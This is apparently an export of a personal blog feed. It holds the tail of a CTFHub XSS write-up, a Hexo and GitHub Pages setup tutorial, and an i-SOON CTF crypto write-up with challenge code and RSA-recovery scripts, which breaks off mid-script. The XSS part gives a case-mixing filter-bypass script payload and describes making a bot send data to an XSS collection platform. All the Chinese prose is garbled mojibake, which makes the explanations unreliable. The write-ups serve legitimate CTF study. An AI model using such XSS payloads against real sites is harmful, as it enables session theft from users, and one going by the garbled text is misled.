<li>XSSè¿‡æ»¤å…³é”®è¯ç»•è¿‡å¯ä»¥ä½¿ç”¨åŒå†™ã€å¤§å°å†™ç­‰æ–¹å¼ï¼Œä¾‹å¦‚<code>&lt;scRipt&gt;alert(1)&lt;/scriPt&gt;</code>ï¼Œç‚¹å‡»æäº¤ï¼Œå‘ç°<code>1</code>è¢«å¼¹å‡ºï¼Œè¯´æ˜å­˜åœ¨XSSæ¼æ´ï¼š<br><img src="/2024/02/12/WriteUp-CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-XSS%E7%B3%BB%E5%88%97/wp-%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E8%AF%8D-2.png"></li>
<li>ç¬¬äºŒä¸ªè¾“å…¥æ¡†è¾“å…¥åŸºäºXXSå¹³å°æä¾›çš„payloadæ„é€ çš„urlï¼Œè®©botæœºå™¨è§¦å‘XSSï¼ŒXSSå¹³å°æˆåŠŸæ¥æ”¶åˆ°æ•°æ®ï¼š<br><img src="/2024/02/12/WriteUp-CTFHub-%E6%8A%80%E8%83%BD%E6%A0%91-XSS%E7%B3%BB%E5%88%97/wp-%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E8%AF%8D-3.png"></li>
</ul>
<h4 id="FLAG-5"><a href="#FLAG-5" class="headerlink" title="FLAG"></a>FLAG</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfhub&#123;6018e7897d2baa06f2a89eaa&#125;</span><br></pre></td></tr></table></figure>

<h4 id="å‚è€ƒ-7"><a href="#å‚è€ƒ-7" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><ul>
<li><a href="https://blog.csdn.net/weixin_49125123/article/details/131546199">CTFHub XSS è¿‡æ»¤å…³é”®è¯ WriteUp_ctfhubè¿‡æ»¤å…³é”®å­—xss-CSDNåšå®¢</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF-WriteUp</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo + github æ­å»ºä¸ªäººåšå®¢æ•™ç¨‹</title>
    <url>/2024/01/20/hexo-github-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="ä»€ä¹ˆæ˜¯hexoï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯hexoï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯hexoï¼Ÿ"></a>ä»€ä¹ˆæ˜¯hexoï¼Ÿ</h2><p>hexoæ˜¯ä¸€ä¸ªåŸºäºnodejsçš„é™æ€åšå®¢æ¡†æ¶ï¼Œå¯ä»¥å¿«é€Ÿæ­å»ºä¸ªäººåšå®¢ï¼Œæ”¯æŒmarkdownè¯­æ³•ï¼Œæ”¯æŒè‡ªå®šä¹‰ä¸»é¢˜ï¼Œæ”¯æŒæ’ä»¶æ‰©å±•ï¼Œæ”¯æŒä¸€é”®éƒ¨ç½²åˆ°githubä¸Šï¼Œæ”¯æŒç¦»çº¿å†™ä½œï¼Œæ”¯æŒå¤šç»ˆç«¯åŒæ­¥ç­‰ç­‰ã€‚</p>
<h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><ul>
<li>å®‰è£…gitï¼Œä¸‹è½½åœ°å€<a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a></li>
<li>å®‰è£…nodejsï¼Œä¸‹è½½åœ°å€<a href="https://nodejs.cn/download/">https://nodejs.cn/download/</a></li>
<li>éªŒè¯nodejsæ˜¯å¦å®‰è£…æˆåŠŸï¼Œæ‰“å¼€cmdï¼Œè¾“å…¥<code>node -v</code>ï¼Œæ˜¾ç¤ºç‰ˆæœ¬å·åˆ™å®‰è£…æˆåŠŸ</li>
<li>npmæ¢æºï¼Œæ‰“å¼€cmdï¼Œè¾“å…¥<code>npm config set registry https://registry.npm.taobao.org</code>ï¼Œæ¢æºæˆåŠŸåï¼Œè¾“å…¥<code>npm config get registry</code>ï¼Œæ˜¾ç¤º<code>https://registry.npm.taobao.org/</code>åˆ™æ¢æºæˆåŠŸ</li>
<li>å®‰è£…hexoï¼Œæ‰“å¼€cmdï¼Œè¾“å…¥<code>npm install -g hexo-cli</code>ï¼Œå®‰è£…æˆåŠŸåï¼Œè¾“å…¥<code>hexo -v</code>ï¼Œæ˜¾ç¤ºç‰ˆæœ¬å·åˆ™å®‰è£…æˆåŠŸ</li>
</ul>
<h2 id="åˆå§‹åŒ–åšå®¢"><a href="#åˆå§‹åŒ–åšå®¢" class="headerlink" title="åˆå§‹åŒ–åšå®¢"></a>åˆå§‹åŒ–åšå®¢</h2><ul>
<li>æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œä¾‹å¦‚<code>Bloggg</code></li>
<li>æ‰“å¼€gitå‘½ä»¤è¡Œï¼Œè¾“å…¥<code>hexo init</code>ï¼Œåˆå§‹åŒ–åšå®¢</li>
<li>æ‰§è¡Œ<code>npm install</code>ï¼Œå®‰è£…é¡¹ç›®ä¾èµ–</li>
<li>æ‰§è¡Œ<code>hexo s</code>ï¼Œå¯åŠ¨æœ¬åœ°æœåŠ¡ï¼Œæ‰“å¼€æµè§ˆå™¨ï¼Œè¾“å…¥<code>http://localhost:4000</code>ï¼Œæ˜¾ç¤ºhexoé»˜è®¤é¡µé¢ï¼Œåˆ™åˆå§‹åŒ–æˆåŠŸ</li>
</ul>
<h2 id="æ–°å»ºæ–‡ç« "><a href="#æ–°å»ºæ–‡ç« " class="headerlink" title="æ–°å»ºæ–‡ç« "></a>æ–°å»ºæ–‡ç« </h2><ul>
<li>åœ¨åšå®¢æ ¹ç›®å½•ä¸‹æ‰§è¡Œ<code>hexo new &quot;æ–‡ç« æ ‡é¢˜&quot;</code>ï¼Œä¼šåœ¨<code>source/_posts</code>ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªmdæ–‡ä»¶ï¼Œä¾‹å¦‚<code>hello-world.md</code></li>
<li>ç¼–è¾‘åšå®¢åï¼Œæ‰§è¡Œ<code>hexo s</code>ï¼Œå¯åŠ¨æœ¬åœ°æœåŠ¡ï¼Œæ‰“å¼€æµè§ˆå™¨ï¼Œè¾“å…¥<code>http://localhost:4000</code>ï¼Œæ˜¾ç¤ºåšå®¢ï¼Œåˆ™æ–°å»ºæ–‡ç« æˆåŠŸ</li>
</ul>
<h2 id="éƒ¨ç½²åˆ°github-pages"><a href="#éƒ¨ç½²åˆ°github-pages" class="headerlink" title="éƒ¨ç½²åˆ°github pages"></a>éƒ¨ç½²åˆ°github pages</h2><ul>
<li>åœ¨githubä¸Šæ–°å»ºä¸€ä¸ªä»“åº“ï¼Œå¿…é¡»ä»¥<code>username.github.io</code>å‘½åï¼Œä¾‹å¦‚æœ¬ç«™çš„ä»“åº“åä¸º<code>yumlii33.github.io</code></li>
<li>ä¿®æ”¹åšå®¢æ ¹ç›®å½•ä¸‹çš„<code>_config.yml</code>æ–‡ä»¶ï¼Œä¿®æ”¹<code>deploy</code>é…ç½®ï¼Œä¾‹å¦‚æœ¬ç«™çš„é…ç½®å¦‚ä¸‹ï¼š  <figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">git</span></span><br><span class="line"><span class="attr">repo:</span> <span class="string">git@github.com:yumlii33/yumlii33.github.io.git</span></span><br><span class="line"><span class="attr">branch:</span> <span class="string">gh-pages</span></span><br></pre></td></tr></table></figure></li>
<li>å®‰è£…ä¸Šä¼ æ’ä»¶ï¼Œæ‰§è¡Œ<code>npm install hexo-deployer-git --save</code></li>
<li>æ‰§è¡Œ<code>hexo clean</code>ï¼Œæ¸…é™¤ç¼“å­˜</li>
<li>æ‰§è¡Œ<code>hexo g</code>ï¼Œç”Ÿæˆé™æ€æ–‡ä»¶</li>
<li>æ‰§è¡Œ<code>hexo d</code>ï¼Œéƒ¨ç½²åˆ°github</li>
<li>è®¿é—®<code>https://username.github.io</code>ï¼Œæ˜¾ç¤ºåšå®¢ï¼Œåˆ™éƒ¨ç½²æˆåŠŸ</li>
</ul>
<h2 id="æºç ä¸Šä¼ åˆ°github"><a href="#æºç ä¸Šä¼ åˆ°github" class="headerlink" title="æºç ä¸Šä¼ åˆ°github"></a>æºç ä¸Šä¼ åˆ°github</h2><ul>
<li>åœ¨æœ¬åœ°hexoæ ¹ç›®å½•ä¸‹æ‰§è¡Œ<code>git init</code>ï¼Œåˆå§‹åŒ–gitä»“åº“</li>
<li>æ‰§è¡Œ<code>git remote add origin git@github.com:username/username.github.io.git</code>ï¼Œæ·»åŠ è¿œç¨‹ä»“åº“</li>
<li>åˆ›å»º<code>.gitignore</code>æ–‡ä»¶ï¼Œæ·»åŠ å¿½ç•¥æ–‡ä»¶ï¼Œä¾‹å¦‚æœ¬ç«™çš„é…ç½®å¦‚ä¸‹ï¼š  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line">db.json</span><br><span class="line">*.log</span><br><span class="line">node_modules/</span><br><span class="line">public/</span><br><span class="line">.deploy*/</span><br></pre></td></tr></table></figure></li>
<li>æ‰§è¡Œ<code>git add .</code>ï¼Œæ·»åŠ æ‰€æœ‰æ–‡ä»¶åˆ°æš‚å­˜åŒº</li>
<li>æ‰§è¡Œ<code>git commit -m &quot;init&quot;</code>ï¼Œæäº¤åˆ°æœ¬åœ°ä»“åº“</li>
<li>æ‰§è¡Œ<code>git push -u origin master</code>ï¼Œä¸Šä¼ åˆ°è¿œç¨‹ä»“åº“ä¸»åˆ†æ”¯</li>
</ul>
<h2 id="æ–°ç¯å¢ƒéƒ¨ç½²"><a href="#æ–°ç¯å¢ƒéƒ¨ç½²" class="headerlink" title="æ–°ç¯å¢ƒéƒ¨ç½²"></a>æ–°ç¯å¢ƒéƒ¨ç½²</h2><ul>
<li>åœ¨æ–°ç¯å¢ƒä¸‹ï¼Œæ‰§è¡Œ<code>git clone</code>ï¼Œå…‹éš†ä»“åº“åˆ°æœ¬åœ°</li>
<li>æ‰§è¡Œ<code>npm install</code>ï¼Œå®‰è£…é¡¹ç›®ä¾èµ–</li>
<li>æ‰§è¡Œ<code>hexo s</code>ï¼Œå¯åŠ¨æœ¬åœ°æœåŠ¡ï¼Œæ‰“å¼€æµè§ˆå™¨ï¼Œè¾“å…¥<code>http://localhost:4000</code>ï¼Œæ˜¾ç¤ºåšå®¢ï¼Œåˆ™éƒ¨ç½²æˆåŠŸ</li>
</ul>
<blockquote>
<p>æ³¨æ„ï¼šå› ä¸ºæ²¡æœ‰ä¸Šä¼ <code>node_modules</code>æ–‡ä»¶å¤¹ï¼Œæ‰€ä»¥éœ€è¦æ‰§è¡Œ<code>npm install</code>å®‰è£…é¡¹ç›®ä¾èµ–ï¼Œå¦‚æœéœ€è¦å¯¹æ’ä»¶è¿›è¡Œè‡ªå®šä¹‰ä¿®æ”¹ï¼Œéœ€è¦åœ¨æ–°ç¯å¢ƒä¸­é‡æ–°é…ç½®</p>
</blockquote>
<h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ul>
<li><a href="https://www.cnblogs.com/huanhao/p/hexobase.html">ã€åŸºç¡€ç¯‡ã€‘hexoåšå®¢æ­å»ºæ•™ç¨‹ - huanhao - åšå®¢å›­</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/71544809">ä½¿ç”¨gitåˆ†æ”¯ä¿å­˜hexoåšå®¢æºç åˆ°github - çŸ¥ä¹</a></li>
</ul>
]]></content>
      <categories>
        <category>æ•™ç¨‹</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>WriteUp-ç¬¬å…­å±Šå®‰æ´µæ¯ç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ›-010101</title>
    <url>/2024/01/07/WriteUp-%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B-010101/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="èµ›äº‹åç§°"><a href="#èµ›äº‹åç§°" class="headerlink" title="èµ›äº‹åç§°"></a>èµ›äº‹åç§°</h2><p>i-SOON_CTF_2023<br>ç¬¬å…­å±Šå®‰æ´µæ¯ç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ›   </p>
<h2 id="èµ›äº‹æè¿°"><a href="#èµ›äº‹æè¿°" class="headerlink" title="èµ›äº‹æè¿°"></a>èµ›äº‹æè¿°</h2><p><a href="https://dce.i-soon.net/#/examineDetails">https://dce.i-soon.net/#/examineDetails</a></p>
<h2 id="èµ›äº‹ç½‘å€"><a href="#èµ›äº‹ç½‘å€" class="headerlink" title="èµ›äº‹ç½‘å€"></a>èµ›äº‹ç½‘å€</h2><p><a href="https://dce.i-soon.net/#/examineDetails">https://dce.i-soon.net/#/examineDetails</a></p>
<h2 id="010101"><a href="#010101" class="headerlink" title="010101"></a>010101</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime, long_to_bytes, getStrongPrime, bytes_to_long</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;D0g3&#123;******************************************&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyServer</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">proof</span>(<span class="params">self</span>):</span><br><span class="line">        random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">        random_str = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">        str_sha256 = hashlib.sha256(random_str.encode()).hexdigest()</span><br><span class="line">        self.request.sendall((<span class="string">&#x27;SHA256(XXXX + %s):%s\n&#x27;</span> % (random_str[<span class="number">4</span>:], str_sha256)).encode())</span><br><span class="line">        self.request.sendall(<span class="string">&#x27;Give Me XXXX:\n&#x27;</span>.encode())</span><br><span class="line">        XXXX = self.request.recv(<span class="number">2048</span>).strip()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> hashlib.sha256((XXXX + random_str[<span class="number">4</span>:].encode())).hexdigest() != str_sha256:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getPQN</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = getStrongPrime(<span class="number">2048</span>)</span><br><span class="line">            q = getStrongPrime(<span class="number">2048</span>)</span><br><span class="line">            n = p * q</span><br><span class="line">            <span class="keyword">if</span> p.bit_length() == <span class="number">2048</span> <span class="keyword">and</span> q.bit_length() == <span class="number">2048</span> <span class="keyword">and</span> n.bit_length() == <span class="number">4096</span>:</span><br><span class="line">                <span class="keyword">return</span> p, q, n</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        p, q, n = self.getPQN()</span><br><span class="line">        m = bytes_to_long(flag)</span><br><span class="line">        e = <span class="number">0x10001</span></span><br><span class="line">        c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">        p = <span class="built_in">bin</span>(p)[<span class="number">2</span>:]</span><br><span class="line">        p1 = <span class="built_in">list</span>(p[:<span class="number">1024</span>])</span><br><span class="line">        p2 = <span class="built_in">list</span>(p[<span class="number">1024</span>:])</span><br><span class="line">        p1[random.choice([i <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(p1) <span class="keyword">if</span> c == <span class="string">&#x27;1&#x27;</span>])] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        p2[random.choice([i <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(p1) <span class="keyword">if</span> c == <span class="string">&#x27;0&#x27;</span>])] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> n, <span class="string">&#x27;&#x27;</span>.join(p1) + <span class="string">&#x27;&#x27;</span>.join(p2), c</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.proof():</span><br><span class="line">            self.request.sendall(<span class="string">b&#x27;Error Hash!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        n, p, c = self.encrypt()</span><br><span class="line">        self.request.sendall(<span class="string">&#x27;Press 1 to get ciphertext\n&#x27;</span>.encode())</span><br><span class="line">        number = self.request.recv(<span class="number">512</span>).strip().decode()</span><br><span class="line">        <span class="keyword">if</span> number == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            self.request.sendall((<span class="built_in">str</span>(n) + <span class="string">&#x27;\n&#x27;</span>).encode())</span><br><span class="line">            self.request.sendall((<span class="built_in">str</span>(p) + <span class="string">&#x27;\n&#x27;</span>).encode())</span><br><span class="line">            self.request.sendall((<span class="built_in">str</span>(c) + <span class="string">&#x27;\n&#x27;</span>).encode())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.request.sendall(<span class="string">&#x27;Incorrect input!\n&#x27;</span>.encode())</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sever = socketserver.ThreadingTCPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10001</span>), MyServer)</span><br><span class="line">    ThreadedTCPServer.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    ThreadedTCPServer.allow_reuse_port = <span class="literal">True</span></span><br><span class="line">    sever.serve_forever()</span><br></pre></td></tr></table></figure>

<h3 id="è€ƒç‚¹"><a href="#è€ƒç‚¹" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h3><ul>
<li><code>crypto</code></li>
<li><code>SHA256</code></li>
<li><code>RSA</code></li>
</ul>
<h3 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h3><ul>
<li>åˆ†æä»£ç é€»è¾‘ï¼š<ul>
<li><code>proof</code>ï¼š<ul>
<li>éšæœºç”Ÿæˆä¸€ä¸ªå­—ç¬¦ä¸²<code>random_str</code></li>
<li>è®¡ç®—å­—ç¬¦ä¸²çš„å“ˆå¸Œå€¼<code>str_sha256</code></li>
<li>ç»™å‡º<code>random_str[4:]</code>å’Œ<code>str_sha256</code>ï¼Œè®©ç”¨æˆ·è®¡ç®—<code>random_str[:4]</code></li>
<li>å¦‚æœç”¨æˆ·ç»™å®šçš„<code>random_str[:4]</code>å’Œ<code>random_str[4:]</code>çš„å“ˆå¸Œå€¼ç›¸åŒï¼Œåˆ™éªŒè¯é€šè¿‡</li>
</ul>
</li>
<li><code>getPQN</code>ï¼š<ul>
<li>éšæœºç”Ÿæˆä¸¤ä¸ªå¤§ç´ æ•°<code>p</code>å’Œ<code>q</code>ï¼Œæ»¡è¶³ä»¥ä¸‹è¦æ±‚ï¼š<code>p.bit_length() == 2048 and q.bit_length() == 2048 and (p*q).bit_length() == 4096</code></li>
<li><code>return p, q, n</code></li>
</ul>
</li>
<li><code>encrypt</code>ï¼š<ul>
<li>é€šè¿‡<code>getPQN</code>ç”Ÿæˆ<code>p</code>å’Œ<code>q</code>å’Œ<code>n</code></li>
<li>è®¡ç®—å¯†æ–‡<code>c = pow(m, e, n)</code></li>
<li>å¯¹<code>p</code>è¿›è¡Œå˜æ¢ï¼šå‰1024ä½éšæœºæŒ‘é€‰ä¸€ä¸ª1å˜æˆ0ï¼Œå1024ä½éšæœºæŒ‘é€‰ä¸€ä½å˜æˆ1ï¼Œå¾—åˆ°<code>fake_p</code></li>
<li><code>return n, fake_p, c</code></li>
</ul>
</li>
<li><code>handle</code>ï¼š   <ul>
<li>é€šè¿‡<code>proof</code>å‡½æ•°åˆ¤æ–­ç”¨æˆ·è¾“å…¥çš„<code>XXXX</code>å’Œ<code>random_str[4:]</code>çš„å“ˆå¸Œå€¼æ˜¯å¦ç›¸åŒ         </li>
<li>ç›¸åŒçš„è¯ï¼Œé€šè¿‡<code>encrypt</code>å‡½æ•°å¯¹<code>flag</code>è¿›è¡ŒåŠ å¯†ï¼Œè¿”å›<code>n, fake_p, c</code></li>
</ul>
</li>
</ul>
</li>
<li>è§£é¢˜æ­¥éª¤ï¼š<ul>
<li><code>nc</code>è¿å…¥æœåŠ¡å™¨ï¼Œè·å–<code>random_str[4:]</code>å’Œ<code>str_sha256</code><br><img src="/2024/01/07/WriteUp-%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B-010101/nc%E8%BF%9E%E6%8E%A5%E5%9B%9E%E6%98%BE.png"></li>
<li>é€šè¿‡<code>getXXXX.py</code>çˆ†ç ´<code>random_str[:4]</code>ï¼Œå¹¶å°†ç»“æœå‘é€ç»™æœåŠ¡å™¨ï¼Œè·å¾—<code>nï¼Œfake_pï¼Œc</code><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits, ascii_letters, punctuation</span><br><span class="line">alpha_bet=digits+ascii_letters+punctuation</span><br><span class="line">strlist = itertools.product(alpha_bet, repeat=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sha256=<span class="string">&quot;5ccd4cda1dc33d20a072cddf2cf921c865b274da912edb7ac3f157404c3fe4e3&quot;</span></span><br><span class="line">tail=<span class="string">&quot;uLBLoFfDko5h5uA9&quot;</span></span><br><span class="line"></span><br><span class="line">xxxx=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">    data=i[<span class="number">0</span>]+i[<span class="number">1</span>]+i[<span class="number">2</span>]+i[<span class="number">3</span>]</span><br><span class="line">    data_sha=hashlib.sha256((data+<span class="built_in">str</span>(tail)).encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span>(data_sha==<span class="built_in">str</span>(sha256)):</span><br><span class="line">        xxxx=data</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(xxxx)</span><br></pre></td></tr></table></figure></li>
<li>åŸºäº<code>encrypt</code>å‡½æ•°ï¼Œç¼–å†™<a href="./files/decrypt.py"><code>decrypt.py</code></a>è„šæœ¬ï¼Œç ´è§£<code>p</code>ï¼Œè§£å¯†å¾—åˆ°<code>flag</code><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n=<span class="number">909467367699122020071016988650306999295228108976638769699035391871165765547800730173871546690865275123375066230171521311068819816852640125745292539541259006023609504769135551654529045891894185101263480691408339167146959806826342796151867522273018753414683125578415962666829770904166690498846087399777025030862122796483743577214854248422262763202974262015130017066825754008160259189414818697567284326444565265735329976239935592453543076795651573576794776003238789860869381589213987112412732442793109900427324085928201408085720252507826509949584097216821241278182597257299885172782505117521436358744947983811939554943145617958259867137670519879871430621545154465019553001205911580515698810275961361004704605451591223643427530911392689056988136336912424730785373902092658701108834786609423741166892942322112744091173801215997979197781791157780385712374075574951133435122784372704793303399699730638707098947178219189508884581830248871075957102690166621382729933821529281361101591281902812061185346676660877303782149165897420682724683205662866974137418732285231256810541807361468193401184858075051706155601176563558866315093106261534227649361408522136583934234512184301782185760219449297423394506961283209453334215176208906015567865682661</span></span><br><span class="line">fake_p=<span class="string">&#x27;11100000100010111111010011100000110011001000001001111011001010011100001101000000001010000010101000011110000001000000010111000110101000101101011101111010001110110000000001101110100011101001100011101010110011111001001011101000110100011011101011110110001111100110101000010110110001001110001101111111100001101101110010011110100101110001101101101011011100111110101111000111000010011101001000011110000101111000010110000001100001111001011100011001110110110110000110000110111010111101110111100100111101111001100110010000000110011011111011111100000010010111111000010110010000110000111100011001111010101000111110011110001010101010010100001010100110111111101010010000000100101011001011100100111111001000111011111010101011111111010011101110111111110011101111001000011011000000000011100101101000001101110101100001110000110101011001000010110110000110110001101010110001100010110010110000000001110001101111011100011011110101010010011010100011010100010101100000010111100000101100010110000100001001101001001001111011011000101010001011010001100101110111111100111111001011100001100001011101011000000001101111011011001001100100111101100100111100100000000111110100011100011110001101100000100000101001101100010100000110111010001111011010110100101010101100000000001111001111010100011000010010010001010011100111100001101100111100010101111101011001100011111011000011101111110101110010100011000111010100000000111110111001111110100011100100111101001101011010110001100000101010001111000110100110101110001011100010011100111110111111010001110111000001000010111110100000110110110010111101101111010010110100011110110011011010010000000000101110101001001111100110111111001000000101101011111011110110111111001101001111011100110101101010101100000010100111101110110101101010100110011010011101101000010011101011001011110001011110011000101110000100000110100011101001100101110000001110100111010110110000101000011011010011100101101011010010010100110011011100001110001000000111101111000001010110111111010110101111000100111111111111101111001110101101111111101111011011101111111000100000110111&#x27;</span></span><br><span class="line">c=<span class="number">694500789519839583373480124753870609796624184368847740052659890684952282469412685843793893336588959688292535565388961237054382061607809034620598317779687541764120119851622500197513641485700221545824097256986828990721130988465432457926804939623885349284941907683524562179105951076405178191916974212394857571647273209891325684133975190612454243345915122493599006273649156588911638621279271660577286076492174133379924878816759449537816258877983535822071467357826352013991371273144147958254806851665648862909470014188217381547444474766611515043375595448634817257201321537710925281810846187991415244304258902323932755496219900194257710795367213151869032406828586461628113793387618900293473170817978068346842472541499877290335671510770413540109295368927586613167172537907784632075379648806105818669008103026164730513033786875076959900405998112656279798642754984874654321483935047414576483030634418889375971016788408747123075626184286939742532706576269950026208168650867226593584227608482405783125152467929531339747039920420671850985997912834217484356948372454631601487864570640693252550030654681522447089126289751692094672022733644147229926742656125552935762042624836326359406490008032106080800094693108856102201450516929541344003829402493</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_p1=<span class="built_in">list</span>(fake_p[:<span class="number">1024</span>])</span><br><span class="line">fake_p2=<span class="built_in">list</span>(fake_p[<span class="number">1024</span>:])</span><br><span class="line">p=<span class="number">0</span></span><br><span class="line">q=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(fake_p1):</span><br><span class="line">    <span class="keyword">if</span> x == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        p1=fake_p1[:i]+[<span class="string">&#x27;1&#x27;</span>]+fake_p1[i+<span class="number">1</span>:]</span><br><span class="line">        p2=fake_p2</span><br><span class="line">        p=<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(p1)+<span class="string">&#x27;&#x27;</span>.join(p2),<span class="number">2</span>)   </span><br><span class="line">        <span class="keyword">if</span> n%p==<span class="number">0</span>:</span><br><span class="line">            q=n//p</span><br><span class="line">            <span class="keyword">if</span> p.bit_length() == <span class="number">2048</span> <span class="keyword">and</span> q.bit_length() == <span class="number">2048</span> <span class="keyword">and</span> n.bit_length() == <span class="number">4096</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Get p q!\n&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;bad format1!&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:         </span><br><span class="line">            <span class="keyword">for</span> j,y <span class="keyword">in</span> <span class="built_in">enumerate</span>(fake_p2):</span><br><span class="line">                <span class="keyword">if</span> y== <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                    p2=fake_p2[:j]+[<span class="string">&#x27;0&#x27;</span>]+fake_p2[j+<span class="number">1</span>:]</span><br><span class="line">                    p=<span class="built_in">int</span>(<span 